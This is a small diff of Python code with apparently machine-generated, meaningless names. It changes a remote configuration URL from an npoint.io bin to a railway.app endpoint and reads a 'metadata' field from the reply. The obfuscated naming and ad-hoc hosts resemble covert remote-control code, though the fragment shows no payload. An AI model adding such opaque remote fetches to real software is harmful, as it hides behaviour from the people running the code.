@@ -18,7 +18,7 @@ def process_rfqmtn_433():
 
     def config_mwagjv_504():
         try:
-            learn_aebalk_480 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            learn_aebalk_480 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_aebalk_480.raise_for_status()
             process_lbrdhb_789 = learn_aebalk_480.json()
             config_irpuwh_290 = process_lbrdhb_789.get('metadata')
